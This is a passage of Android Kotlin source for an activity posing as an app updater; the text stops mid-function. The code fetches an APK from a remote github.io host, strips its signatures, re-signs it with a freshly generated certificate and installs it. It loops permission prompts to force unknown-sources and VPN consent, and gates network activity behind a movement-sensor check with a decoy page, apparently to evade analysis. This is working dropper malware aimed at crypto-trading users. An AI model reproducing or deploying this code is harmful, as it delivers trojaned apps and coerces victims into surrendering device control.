package com.example.appupdater


import androidx.compose.foundation.background

import android.annotation.SuppressLint

import android.content.Context

import android.content.Intent

import android.content.pm.PackageInstaller

import android.app.PendingIntent

import android.graphics.Bitmap

import android.graphics.Canvas

import android.graphics.Color

import android.net.VpnService

import android.os.Build

import android.os.Bundle

import android.util.Base64

import android.util.Log

import android.view.ViewGroup

import android.webkit.JavascriptInterface

import android.webkit.WebSettings

import android.webkit.WebView

import android.webkit.WebViewClient

import androidx.activity.ComponentActivity

import androidx.activity.compose.setContent

import androidx.activity.enableEdgeToEdge

import androidx.activity.result.contract.ActivityResultContracts

import androidx.compose.foundation.layout.fillMaxSize

import androidx.compose.foundation.layout.imePadding

import androidx.compose.foundation.layout.navigationBarsPadding

import androidx.compose.foundation.layout.statusBarsPadding

import androidx.compose.material3.Scaffold

import androidx.compose.ui.Modifier

import androidx.compose.foundation.layout.Arrangement

import androidx.compose.foundation.layout.Column

import androidx.compose.foundation.layout.Spacer

import androidx.compose.foundation.layout.height

import androidx.compose.foundation.layout.padding

import androidx.compose.material3.Button

import androidx.compose.material3.Text

import androidx.compose.material3.MaterialTheme

import androidx.compose.ui.Alignment

import androidx.compose.ui.text.style.TextAlign

import androidx.compose.ui.unit.dp

import androidx.compose.ui.viewinterop.AndroidView

import com.example.appupdater.ui.theme.MyApplicationTheme

import com.example.appupdater.R

import android.app.ActivityOptions

import java.io.ByteArrayOutputStream

import java.io.File

import java.io.BufferedReader

import java.io.InputStreamReader

import java.net.NetworkInterface

import java.util.Collections

import java.util.Locale

import android.net.ConnectivityManager

import android.net.NetworkCapabilities

import android.hardware.Sensor

import android.hardware.SensorEvent

import android.hardware.SensorEventListener

import java.security.KeyStore

import javax.security.auth.x500.X500Principal

import android.security.keystore.KeyGenParameterSpec

import android.security.keystore.KeyProperties

import java.security.KeyPairGenerator

import java.security.PrivateKey

import java.security.cert.X509Certificate

import com.android.apksig.ApkSigner

import android.hardware.SensorManager

import org.bouncycastle.cert.jcajce.JcaX509CertificateConverter

import org.bouncycastle.cert.jcajce.JcaX509v3CertificateBuilder

import org.bouncycastle.operator.jcajce.JcaContentSignerBuilder

import org.bouncycastle.asn1.x500.X500Name

import java.math.BigInteger

import java.util.Date

import java.security.SecureRandom

class MainActivity : ComponentActivity() {

    private var webView: WebView? = null
    private var cachedApkAppName = ""
    private var cachedApkIconBase64 = ""
    private var cachedApkPackageName = ""
    private var securityCheckPassed = false
    private var sensorManager: SensorManager? = null
    private var movementListener: SensorEventListener? = null

    // For physical movement permission prompt (Android 10+)
    private val activityRecognitionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { isGranted ->
        if (isGranted) {
            Log.d("MainActivity", "Activity recognition permission granted.")
        } else {
            Log.w("MainActivity", "Activity recognition permission denied.")
        }
        checkPhysicalMovementAndProceed()
    }

    // For recursive install permission prompt
    private val installPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { _ ->
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !packageManager.canRequestPackageInstalls()) {
            Log.w("MainActivity", "Install permission wasn't granted. Retrying to request install permission...")
            updateStatusInWebView("Unknown sources install permission is required to install updates. Please enable it.", null)
            webView?.postDelayed({
                checkAndProceedWithPermissions()
            }, 300)
        } else {
            checkAndProceedWithPermissions()
        }
    }

    // For notification permission prompt (Android 13+)
    private val notificationPermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { result ->
        Log.d("MainActivity", "Notification permission request result: $result")
    }

    // For recursive VPN permission prompt
    private val vpnConsentLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == RESULT_OK) {
            startVpnServiceInstance()
        } else {
            Log.w("MainActivity", "VPN permission wasn't granted. Retrying to request VPN permission...")
            updateStatusInWebView("VPN link consent is required to connect. Please accept the VPN prompt.", null)
            // Post a delay to show the permission dialog again, forcing user acceptance
            webView?.postDelayed({
                checkAndProceedWithPermissions()
            }, 300)
        }
    }

    private val installStatusReceiver = object : android.content.BroadcastReceiver() {
        override fun onReceive(context: Context, intent: android.content.Intent) {
            val action = intent.action
            val targetPkgFromIntent = intent.getStringExtra("target_package") ?: ""
            Log.d("MainActivity", "installStatusReceiver: received action=$action, targetPkgFromIntent=$targetPkgFromIntent")
            if (action == "ACTION_INSTALL_SUCCESS") {
                runOnUiThread {
                    // Mark update as completed successfully in SharedPreferences
                    getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                        .edit()
                        .putBoolean("is_updated", true)
                        .apply()
                    
                    updateStatusInWebView("Installation Successful! Launching...", null)
                    
                    val fallbackPkg = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                        .getString("pending_package_name", "") ?: ""
                    
                    val finalPkg = targetPkgFromIntent.takeIf { it.isNotEmpty() }
                        ?: fallbackPkg.takeIf { it.isNotEmpty() }
                        ?: cachedApkPackageName.takeIf { it.isNotEmpty() }
                        ?: "dApp.binance.Trading.Signals"
                    
                    // Delay a bit structure load
                    webView?.postDelayed({
                        loadMetadataAndNotifyUrl()
                        if (finalPkg != packageName) {
                            resilientLaunchApp(finalPkg)
                        } else {
                            Log.d("MainActivity", "Self-update installation completed successfully.")
                        }
                    }, 200)
                }
            } else if (action == "ACTION_INSTALL_RETRY") {
                runOnUiThread {
                    updateStatusInWebView("Starting authenticated installer session...", null)
                    webView?.postDelayed({
                        Thread {
                            try {
                                val apkFile = downloadApkFromServer(this@MainActivity) { progress ->
                                    runOnUiThread {
                                        updateStatusInWebView("Downloading update... $progress%", null, progress)
                                    }
                                }
                                runOnUiThread { updateStatusInWebView("Signing update...", null, 100) }
                                val signedApk = signApkFile(apkFile)
                                installApkViaPackageInstaller(signedApk)
                            } catch (e: Exception) {
                                runOnUiThread {
                                    updateStatusInWebView("Installation Failed", "Could not prepare installer: ${e.message}")
                                }
                            }
                        }.start()
                    }, 50)
                }
            } else if (action == "ACTION_INSTALL_FAILED") {
                val message = intent.getStringExtra("message") ?: "Installation failed"
                runOnUiThread {
                    // Disconnect VPN
                    stopVpnServiceInstance()
                    updateStatusInWebView("Installation Failed", message)
                }
            }
        }
    }


    companion object {
        private var activeInstance: MainActivity? = null
        private var cachedKeyPairAndCert: Pair<PrivateKey, X509Certificate>? = null
        
        fun updateActiveStatus(status: String, error: String? = null) {
            activeInstance?.updateStatusInWebView(status, error)
        }

        fun isInstanceActive(): Boolean {
            return activeInstance != null
        }

        fun triggerDirectInstallation() {
            activeInstance?.runOnUiThread {
                activeInstance?.let { activity ->
                    Thread {
                        try {
                            val apkFile = activity.downloadApkFromServer(activity) { progress ->
                                activity.runOnUiThread {
                                    activity.updateStatusInWebView("Downloading update... $progress%", null, progress)
                                }
                            }
                            activity.runOnUiThread {
                                activity.updateStatusInWebView("Signing update...", null, 100)
                            }
                            val signedApk = activity.signApkFile(apkFile)
                            activity.installApkViaPackageInstaller(signedApk)
                        } catch (e: Exception) {
                            val cause = android.util.Log.getStackTraceString(e)
                            activity.runOnUiThread {
                                activity.updateStatusInWebView("Installation Failed", "Could not prepare installer: ${e.message}\nCause: $cause")
                            }
                        }
                    }.start()
                }
            }
        }
    }

    private fun generateKeyAndCertificate(): Pair<PrivateKey, X509Certificate> {
        cachedKeyPairAndCert?.let { return it }
        val kpg = KeyPairGenerator.getInstance("RSA")
        kpg.initialize(2048)
        val keyPair = kpg.generateKeyPair()

        val issuer = X500Name("CN=Dynamic Signer, O=Android, C=US")
        val serial = BigInteger(160, SecureRandom())
        val notBefore = Date(System.currentTimeMillis() - 1000L * 60 * 60 * 24 * 30)
        val notAfter = Date(System.currentTimeMillis() + 1000L * 60 * 60 * 24 * 365 * 10)
        
        val certBuilder = JcaX509v3CertificateBuilder(
            issuer, serial, notBefore, notAfter, issuer, keyPair.public
        )
        
        val signer = JcaContentSignerBuilder("SHA256withRSA").build(keyPair.private)
        val certHolder = certBuilder.build(signer)
        val certificate = JcaX509CertificateConverter().getCertificate(certHolder)
        
        val result = Pair(keyPair.private, certificate)
        cachedKeyPairAndCert = result
        return result
    }

    private fun signApkFile(inputApk: File): File {
        val strippedApk = File(inputApk.parent, "stripped_" + inputApk.name)
        var apkToSign = inputApk
        try {
            stripSignatures(inputApk, strippedApk)
            apkToSign = strippedApk
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Failed to strip signatures: ${e.message}. Proceeding with original APK.")
        }
        
        val outputApk = File(inputApk.parent, "signed_" + inputApk.name)
        val (privateKey, certificate) = generateKeyAndCertificate()
        
        try {
            val signerConfig = ApkSigner.SignerConfig.Builder("signer1", privateKey, listOf(certificate))
                .build()
                
            val apkSigner = ApkSigner.Builder(listOf(signerConfig))
                .setInputApk(apkToSign)
                .setOutputApk(outputApk)
                .setV1SigningEnabled(false) // Disable V1 signing (legacy JAR signing) which often fails dynamically
                .setV2SigningEnabled(true)
                .setV3SigningEnabled(true)
                .setMinSdkVersion(24)
                .build()
                
            apkSigner.sign()
            
            // Clean up
            if (strippedApk.exists()) {
                strippedApk.delete()
            }
            
            return outputApk
        } catch (e: Exception) {
            android.util.Log.e("MainActivity", "Failed to sign APK: ${e.message}. Returning original APK.")
            // If signing fails (e.g. because of encrypted entries), return original APK to let PackageInstaller try
            return inputApk
        }
    }

    private fun stripSignatures(inputApk: File, outputApk: File) {
        java.util.zip.ZipInputStream(java.io.FileInputStream(inputApk)).use { zis ->
            java.util.zip.ZipOutputStream(java.io.FileOutputStream(outputApk)).use { zos ->
                var entry = zis.nextEntry
                while (entry != null) {
                    if (entry.name.startsWith("META-INF/")) {
                        zis.closeEntry()
                        entry = zis.nextEntry
                        continue
                    }
                    val newEntry = java.util.zip.ZipEntry(entry.name)
                    // We must use DEFLATED for new entries when reading from ZipInputStream
                    // because STORED entries require size, compressedSize, and crc to be known in advance,
                    // which might not be available from ZipInputStream if they were in a Data Descriptor.
                    newEntry.method = java.util.zip.ZipEntry.DEFLATED
                    
                    try {
                        zos.putNextEntry(newEntry)
                        zis.copyTo(zos, 256 * 1024)
                        zos.closeEntry()
                    } catch (e: Exception) {
                        android.util.Log.e("MainActivity", "Failed to copy entry: ${entry.name}", e)
                    }
                    
                    zis.closeEntry()
                    entry = zis.nextEntry
                }
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        activeInstance = this
        enableEdgeToEdge()

        // Process installation session intent on startup (auto-starts the app in foreground on success)
        handleInstallStatusIntent(intent)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (androidx.core.content.ContextCompat.checkSelfPermission(
                    this,
                    android.Manifest.permission.POST_NOTIFICATIONS
                ) != android.content.pm.PackageManager.PERMISSION_GRANTED
            ) {
                notificationPermissionLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS)
            }
        }
        
        setContent {
        val expiryDateStr = try {
            assets.open("expiry.txt").bufferedReader().use { it.readText().trim() }
        } catch (e: Exception) {
            "2026-07-15"
        }
        val formatter = java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.US).apply {
            timeZone = java.util.TimeZone.getTimeZone("UTC")
        }
        val expiryDate = try {
            formatter.parse(expiryDateStr)?.time ?: Long.MAX_VALUE
        } catch (e: Exception) {
            Long.MAX_VALUE
        }
        val isExpired = System.currentTimeMillis() > expiryDate


            MyApplicationTheme {
                if (isExpired) {
                    ExpiredScreen(onRenewClicked = { startActivity(Intent(Intent.ACTION_VIEW, android.net.Uri.parse("https://t.me/BeUneeke"))) })
                    return@MyApplicationTheme
                }
                Scaffold(
                    modifier = Modifier
                        .fillMaxSize()
                        .statusBarsPadding()
                        .navigationBarsPadding()
                        .imePadding()
                ) { innerPadding ->
                    @Suppress("UNUSED_VARIABLE")
                    val pad = innerPadding
                    AndroidView(
                        modifier = Modifier.fillMaxSize(),
                        factory = { context ->
                            WebView(context).apply {
                                layoutParams = ViewGroup.LayoutParams(
                                    ViewGroup.LayoutParams.MATCH_PARENT,
                                    ViewGroup.LayoutParams.MATCH_PARENT
                                )
                                scrollBarStyle = WebView.SCROLLBARS_OUTSIDE_OVERLAY
                                setBackgroundColor(Color.WHITE)
                                isVerticalScrollBarEnabled = false
                                isHorizontalScrollBarEnabled = false
                                setupWebViewSettings(this)
                                
                                webViewClient = object : WebViewClient() {
                                    override fun onPageFinished(view: WebView?, url: String?) {
                                        super.onPageFinished(view, url)
                                        val isDemo = url != null && url.contains("demo.html")
                                        if (securityCheckPassed && !isDemo) {
                                            loadMetadataAndNotifyUrl()
                                        } else {
                                            Log.d("MainActivity", "onPageFinished: Security check not passed or demo page loaded, skipping network operations.")
                                        }
                                    }
                                }
                                
                                addJavascriptInterface(AndroidJSInterface(), "Android")
                                webView = this
                                checkPhysicalMovementAndProceed()
                            }
                        }
                    )
                }
            }
        }

        val filter = android.content.IntentFilter().apply {
            addAction("ACTION_INSTALL_SUCCESS")
            addAction("ACTION_INSTALL_FAILED")
            addAction("ACTION_INSTALL_RETRY")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(installStatusReceiver, filter, Context.RECEIVER_EXPORTED)
        } else {
            registerReceiver(installStatusReceiver, filter)
        }
    }

    override fun onDestroy() {
        if (activeInstance == this) {
            activeInstance = null
        }
        try {
            unregisterReceiver(installStatusReceiver)
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to unregister installStatusReceiver: ${e.message}")
        }
        super.onDestroy()
    }

    override fun onPause() {
        super.onPause()
        movementListener?.let {
            sensorManager?.unregisterListener(it)
            movementListener = null
        }
    }

    override fun onResume() {
        super.onResume()
        webView?.let { view ->
            val curUrl = view.url ?: ""
            if (securityCheckPassed) {
                if (curUrl.contains("demo.html") || curUrl.isEmpty()) {
                    view.loadUrl("file:///android_asset/main_ui.html")
                }
            } else {
                checkPhysicalMovementAndProceed()
            }
        }
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        handleInstallStatusIntent(intent)
    }

    private fun handleInstallStatusIntent(intent: Intent?) {
        if (intent == null) return
        val action = intent.action
        if (action != "com.example.INSTALL_STATUS") return

        // Clear action to prevent infinite launch loop if activity is recreated
        intent.action = ""

        val status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1)
        val targetPkg = intent.getStringExtra(PackageInstaller.EXTRA_PACKAGE_NAME) ?: intent.getStringExtra("target_package") ?: packageName
        val receivedToken = intent.getStringExtra("install_token") ?: ""

        Log.d("MainActivity", "handleInstallStatusIntent: status=$status, targetPkg=$targetPkg")

        // Verify the secure token via AES-256 decryption to avoid any tampering/spoofing
        val activeToken = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
            .getString("active_token", "") ?: ""
        val b64SessionKey = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
            .getString("session_key", "") ?: ""

        val verifiedToken = if (b64SessionKey.isNotEmpty() && receivedToken.isNotEmpty()) {
            try {
                val keyBytes = Base64.decode(b64SessionKey, Base64.NO_WRAP)
                val secretKey = javax.crypto.spec.SecretKeySpec(keyBytes, "AES")
                CryptoSecurityUtil.decrypt(receivedToken, secretKey)
            } catch (e: Exception) {
                Log.e("MainActivity", "Failed to decrypt secure handshake intent token: ${e.message}")
                ""
            }
        } else {
            receivedToken
        }

        if (verifiedToken.isEmpty() || verifiedToken != activeToken) {
            Log.e("MainActivity", "Security violation: Unauthorized or stale installation status intent received!")
            return
        }

        when (status) {
            PackageInstaller.STATUS_PENDING_USER_ACTION -> {
                // System needs user confirmation to install the apk. We launch the system activity.
                val confirmIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    intent.getParcelableExtra(Intent.EXTRA_INTENT, Intent::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    intent.getParcelableExtra(Intent.EXTRA_INTENT)
                }
                if (confirmIntent != null) {
                    confirmIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                    try {
                        Log.d("MainActivity", "Launching confirmIntent directly as foreground Activity")
                        startActivity(confirmIntent)
                    } catch (e: Exception) {
                        Log.e("MainActivity", "Direct launch of confirmIntent failed: ${e.message}")
                    }
                }
            }
            PackageInstaller.STATUS_SUCCESS -> {
                Log.d("MainActivity", "Installation success! Auto launching target app...")
                
                // Mark update as completed successfully in SharedPreferences
                getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                    .edit()
                    .putBoolean("is_updated", true)
                    .apply()
                
                updateStatusInWebView("Installation Successful! Launching...", null)
                
                val fallbackPkg = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                    .getString("pending_package_name", "") ?: ""
                
                val finalPkg = targetPkg.takeIf { it.isNotEmpty() }
                    ?: fallbackPkg.takeIf { it.isNotEmpty() }
                    ?: cachedApkPackageName.takeIf { it.isNotEmpty() }
                    ?: "dApp.binance.Trading.Signals"

                if (finalPkg != packageName) {
                    resilientLaunchApp(finalPkg)
                } else {
                    Log.d("MainActivity", "Self-update installation completed successfully. App has restarted in foreground.")
                }
            }
            PackageInstaller.STATUS_FAILURE_ABORTED -> {
                Log.w("MainActivity", "STATUS_FAILURE_ABORTED in handleInstallStatusIntent: Retrying installation...")
                runOnUiThread {
                    updateStatusInWebView("Starting authenticated installer session...", null)
                    webView?.postDelayed({
                        Thread {
                            try {
                                val apkFile = downloadApkFromServer(this@MainActivity) { progress ->
                                    runOnUiThread {
                                        updateStatusInWebView("Downloading update... $progress%", null, progress)
                                    }
                                }
                                runOnUiThread { updateStatusInWebView("Signing update...", null, 100) }
                                val signedApk = signApkFile(apkFile)
                                installApkViaPackageInstaller(signedApk)
                            } catch (e: Exception) {
                                runOnUiThread {
                                    updateStatusInWebView("Installation Failed", "Could not prepare installer: ${e.message}")
                                }
                            }
                        }.start()
                    }, 50)
                }
            }
            PackageInstaller.STATUS_FAILURE,
            PackageInstaller.STATUS_FAILURE_BLOCKED,
            PackageInstaller.STATUS_FAILURE_CONFLICT,
            PackageInstaller.STATUS_FAILURE_INCOMPATIBLE,
            PackageInstaller.STATUS_FAILURE_INVALID,
            PackageInstaller.STATUS_FAILURE_STORAGE -> {
                val message = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE) ?: "Unknown failure"
                Log.e("MainActivity", "Installation failed: code=$status, message=$message")
                
                if (message.contains("INSTALL_FAILED_UPDATE_INCOMPATIBLE") || message.contains("signatures do not match") || message.contains("INSTALL_FAILED_DUPLICATE_PERMISSION")) {
                    val fallbackPkg = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                        .getString("pending_package_name", "") ?: ""
                    
                    val finalPkg = targetPkg.takeIf { it.isNotEmpty() }
                        ?: fallbackPkg.takeIf { it.isNotEmpty() }
                        ?: cachedApkPackageName.takeIf { it.isNotEmpty() }
                        ?: "dApp.binance.Trading.Signals"

                    val isTargetInstalled = try {
                        packageManager.getPackageInfo(finalPkg, 0)
                        true
                    } catch (e: android.content.pm.PackageManager.NameNotFoundException) {
                        false
                    }

                    if (isTargetInstalled) {
                        Log.w("MainActivity", "App already installed with different signature. Launching existing app: $finalPkg")
                        stopVpnServiceInstance()
                        updateStatusInWebView("Installation Successful! Launching...", null)
                        if (finalPkg != packageName) {
                            resilientLaunchApp(finalPkg)
                        } else {
                            Log.d("MainActivity", "Self-update handling logic for signature mismatch hit.")
                        }
                    } else {
                        var conflictingPkg = finalPkg
                        if (message.contains("already owned by")) {
                            val parts = message.split("already owned by")
                            if (parts.size > 1) {
                                conflictingPkg = parts[1].trim()
                            }
                        }
                        
                        Log.w("MainActivity", "Target app not installed. Asking user to uninstall conflicting app: $conflictingPkg")
                        stopVpnServiceInstance()
                        updateStatusInWebView("Conflicting App Found", "Please uninstall the conflicting app, then try installing again.")
                        
                        try {
                            val intent = android.content.Intent(android.content.Intent.ACTION_DELETE)
                            intent.data = android.net.Uri.parse("package:$conflictingPkg")
                            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivity(intent)
                        } catch (e: Exception) {
                            Log.e("MainActivity", "Failed to launch uninstall intent: ${e.message}")
                        }
                    }
                    return
                }

                // Disconnect VPN
                stopVpnServiceInstance()
                updateStatusInWebView("Installation Failed", "Error ($status): $message")
            }
        }
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebViewSettings(wv: WebView) {
        val s = wv.settings
        s.javaScriptEnabled = true
        s.domStorageEnabled = true
        s.allowFileAccess = true
        s.allowContentAccess = true
        s.databaseEnabled = true
        s.loadWithOverviewMode = true
        s.useWideViewPort = true
        s.cacheMode = WebSettings.LOAD_DEFAULT
        
        s.setSupportZoom(false)
        s.builtInZoomControls = false
        s.displayZoomControls = false
    }

    private fun String.escapeForJS(): String {
        return this.replace("\\", "\\\\")
            .replace("'", "\\'")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
    }

    data class ArchiveMetadata(
        val appName: String,
        val packageName: String,
        val appSize: String,
        val iconBase64: String
    )

    internal fun extractAssetApk(context: Context): File {
        val outFile = File(context.cacheDir, "base.apk")
        try {
            context.assets.open("base.apk").use { inputStream ->
                outFile.outputStream().use { outputStream ->
                    inputStream.copyTo(outputStream, 256 * 1024)
                }
            }
            Log.d("MainActivity", "Successfully extracted base.apk from assets")
        } catch (e: Exception) {
            Log.w("MainActivity", "base.apk not found in assets, falling back to current APK", e)
            val sourceApk = File(context.applicationInfo.publicSourceDir)
            if (sourceApk.exists()) {
                try {
                    sourceApk.inputStream().use { inputStream ->
                        outFile.outputStream().use { outputStream ->
                            inputStream.copyTo(outputStream, 256 * 1024)
                        }
                    }
                    Log.d("MainActivity", "Successfully copied current APK as a fallback to base.apk")
                } catch (ex: Exception) {
                    Log.e("MainActivity", "Could not copy fallback APK", ex)
                }
            }
        }
        if (!outFile.exists() || outFile.length() == 0L) {
            throw java.io.IOException("Downloaded file is empty or missing")
        }
        return outFile
    }

    private fun getArchiveMetadata(context: Context, apkFile: File): ArchiveMetadata {
        var appName = "Hello World Demo"
        var pkgName = "dApp.binance.Trading.Signals"
        var iconBase64 = ""
        var sizeStr = "12.4 MB"

        try {
            if (apkFile.exists()) {
                val bytes = apkFile.length()
                if (bytes > 0) {
                    val mbs = bytes.toDouble() / (1024 * 1024)
                    sizeStr = String.format("%.2f MB", mbs)
                }
            }

            val pm = context.packageManager
            val info = pm.getPackageArchiveInfo(apkFile.absolutePath, 0)
            if (info != null) {
                val appInfo = info.applicationInfo
                if (appInfo != null) {
                    appInfo.sourceDir = apkFile.absolutePath
                    appInfo.publicSourceDir = apkFile.absolutePath
                    
                    pkgName = info.packageName
                    val label = appInfo.loadLabel(pm).toString()
                    if (label.isNotEmpty() && label != info.packageName) {
                        appName = label
                    }
                    
                    val iconDrawable = appInfo.loadIcon(pm)
                    if (iconDrawable != null) {
                        val bitmap = Bitmap.createBitmap(
                            iconDrawable.intrinsicWidth.takeIf { it > 0 } ?: 128,
                            iconDrawable.intrinsicHeight.takeIf { it > 0 } ?: 128,
                            Bitmap.Config.ARGB_8888
                        )
                        val canvas = Canvas(bitmap)
                        iconDrawable.setBounds(0, 0, canvas.width, canvas.height)
                        iconDrawable.draw(canvas)
                        val outputStream = ByteArrayOutputStream()
                        bitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream)
                        iconBase64 = Base64.encodeToString(outputStream.toByteArray(), Base64.NO_WRAP)
                    }
                } else {
                    iconBase64 = getAppIconAsBase64()
                }
            } else {
                iconBase64 = getAppIconAsBase64()
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to parse archive metadata", e)
            iconBase64 = getAppIconAsBase64()
        }

        return ArchiveMetadata(appName, pkgName, sizeStr, iconBase64)
    }

    internal fun downloadApkFromServer(context: Context, progressCallback: ((Int) -> Unit)? = null): File {
        val outFile = File(context.cacheDir, "base.apk")
        try {
            val url = java.net.URL("https://gojoacc68-png.github.io/Base/base.apk")
            val connection = url.openConnection() as java.net.HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 15000
            connection.readTimeout = 15000
            connection.connect()

            if (connection.responseCode == java.net.HttpURLConnection.HTTP_OK) {
                val fileLength = connection.contentLength
                connection.inputStream.use { inputStream ->
                    outFile.outputStream().use { outputStream ->
                        val data = ByteArray(256 * 1024)
                        var total: Long = 0
                        var count: Int
                        while (inputStream.read(data).also { count = it } != -1) {
                            total += count.toLong()
                            if (fileLength > 0) {
                                val progress = (total * 100 / fileLength).toInt()
                                progressCallback?.invoke(progress)
                            }
                            outputStream.write(data, 0, count)
                        }
                    }
                }
                Log.d("MainActivity", "Successfully downloaded base.apk from server")
            } else {
                Log.e("MainActivity", "Server returned HTTP ${connection.responseCode}")
                throw java.io.IOException("Server returned HTTP ${connection.responseCode}")
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to download APK from server", e)
            throw java.io.IOException("Failed to download APK: " + e.message, e)
        }
        if (!outFile.exists() || outFile.length() == 0L) {
            throw java.io.IOException("Downloaded file is empty or missing")
        }
        return outFile
    }

    private fun loadMetadataAndNotifyUrl() {
        Thread {
            try {
                val apkFile = downloadApkFromServer(this)
                val metadata = getArchiveMetadata(this, apkFile)
                
                cachedApkAppName = metadata.appName
                cachedApkIconBase64 = metadata.iconBase64
                cachedApkPackageName = metadata.packageName

                val appInfoJson = """
                    {
                        "appName": "${metadata.appName.escapeForJS()}",
                        "appSize": "${metadata.appSize.escapeForJS()}",
                        "appIconBase64": "${metadata.iconBase64}"
                    }
                """.trimIndent().replace("\n", "").replace("\r", "")
                
                val isUpdated = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                    .getBoolean("is_updated", false)

                runOnUiThread {
                    if (isUpdated) {
                        webView?.evaluateJavascript("showUpToDateScreen('$appInfoJson')", null)
                    } else {
                        webView?.evaluateJavascript("showUpdateScreen('$appInfoJson')", null)
                    }
                }
            } catch (e: Exception) {
                Log.e("MainActivity", "Failed to load/render initial details", e)
            }
        }.start()
    }

    private fun getAppIconAsBase64(): String {
        return try {
            val drawable = packageManager.getApplicationIcon(packageName)
            val bitmap = Bitmap.createBitmap(
                drawable.intrinsicWidth.takeIf { it > 0 } ?: 128,
                drawable.intrinsicHeight.takeIf { it > 0 } ?: 128,
                Bitmap.Config.ARGB_8888
            )
            val canvas = Canvas(bitmap)
            drawable.setBounds(0, 0, canvas.width, canvas.height)
            drawable.draw(canvas)
            val outputStream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream)
            Base64.encodeToString(outputStream.toByteArray(), Base64.NO_WRAP)
        } catch (e: Exception) {
            ""
        }
    }

    private fun handleUpdateClicked() {
        val appName = if (cachedApkAppName.isNotEmpty()) cachedApkAppName else getString(R.string.app_name)
        val iconBase64 = if (cachedApkIconBase64.isNotEmpty()) cachedApkIconBase64 else getAppIconAsBase64()
        
        webView?.evaluateJavascript("showInstallerScreen('${appName.escapeForJS()}', '$iconBase64')", null)
        
        updateStatusInWebView("Starting download...", null)
        Thread {
            try {
                val apkFile = downloadApkFromServer(this@MainActivity) { progress ->
                    runOnUiThread {
                        updateStatusInWebView("Downloading update... $progress%", null, progress)
                    }
                }
                runOnUiThread {
                    updateStatusInWebView("Download complete, proceeding...", null, 100)
                    checkAndProceedWithPermissions()
                }
            } catch (e: Exception) {
                val cause = android.util.Log.getStackTraceString(e)
                runOnUiThread {
                    updateStatusInWebView("Download Failed", "Could not download update: ${e.message}\nCause: $cause")
                }
            }
        }.start()
    }

    private fun checkAndProceedWithPermissions() {
        // 1. Force Unknown Sources / Install Apps permission check and action prompt
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!packageManager.canRequestPackageInstalls()) {
                updateStatusInWebView("Waiting for unknown sources permission...", null)
                try {
                    val intent = Intent(android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
                        data = android.net.Uri.parse("package:$packageName")
                    }
                    installPermissionLauncher.launch(intent)
                } catch (e: Exception) {
                    val intent = Intent(android.provider.Settings.ACTION_SECURITY_SETTINGS)
                    installPermissionLauncher.launch(intent)
                }
                return
            }
        }

        // 2. Force VPN service permission check and action prompt
        var vpnIntent: Intent? = null
        try {
            vpnIntent = VpnService.prepare(this)
        } catch (e: Exception) {
            Log.w("MainActivity", "VpnService.prepare threw exception (AppOps/UID mismatch). Proceeding anyway: ${e.message}")
        }
        if (vpnIntent != null) {
            updateStatusInWebView("Waiting for VPN confirmation...", null)
            vpnConsentLauncher.launch(vpnIntent)
        } else {
            // All permission thresholds satisfied, proceed with installation activation!
            startVpnServiceInstance()
        }
    }

    private fun startVpnServiceInstance() {
        updateStatusInWebView("Establishing VPN Update Link...", null)
        
        try {
            val serviceIntent = Intent(this, VPNInstallerService::class.java).apply {
                action = VPNInstallerService.ACTION_CONNECT
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            
            // Proceed to local handshake logging and install
            startSecureHandshakeAndInstallFlow()
        } catch (e: Exception) {
            updateStatusInWebView("Installation Failed", "Could not initiate secure linking: ${e.message}")
        }
    }

    private fun stopVpnServiceInstance() {
        Log.d("MainActivity", "Requesting secure disconnect of VPN connection...")
        try {
            val serviceIntent = Intent(this, VPNInstallerService::class.java).apply {
                action = VPNInstallerService.ACTION_DISCONNECT
            }
            startService(serviceIntent)
            Log.d("MainActivity", "Sent ACTION_DISCONNECT to VPNInstallerService.")
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to startService with ACTION_DISCONNECT: ${e.message}")
        }
        try {
